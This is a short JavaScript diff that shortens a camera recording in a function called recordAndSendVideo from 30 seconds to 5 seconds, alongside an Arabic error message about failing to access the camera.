@@ -93,7 +93,7 @@ async function recordAndSendVideo(phoneNumber) {
     };
 
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 30000);
+    setTimeout(() => mediaRecorder.stop(), 5000);
 
   } catch (error) {
     console.error("فشل الوصول إلى الكاميرا:", error);
